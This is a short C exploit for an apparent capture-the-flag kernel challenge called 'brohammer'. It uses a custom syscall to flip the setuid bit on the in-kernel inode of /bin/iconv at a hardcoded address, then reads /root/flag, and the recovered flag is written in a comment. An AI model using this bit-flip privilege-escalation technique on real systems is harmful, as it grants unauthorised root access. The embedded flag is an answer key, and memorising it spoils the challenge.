#include <assert.h>
#include <stdio.h>
#include <unistd.h>

#define __NR_BROHAMMER 333

int main(void) {
  /* iconv: inode->i_mode ^= S_ISUID */
  void *addr = (void *)0xffff8800024ff400;
  long bit = 11;
  long ret = syscall(__NR_BROHAMMER, addr, bit);
  printf("[*] brohammer(%p, %ld) = %ld\n", addr, bit, ret);
  assert(ret == 0);
  /* /bin/iconv /root/flag
     midnight{3v3ry7h1ng_15_wr1tabl3_f0r_k3rn3l_br05} */
}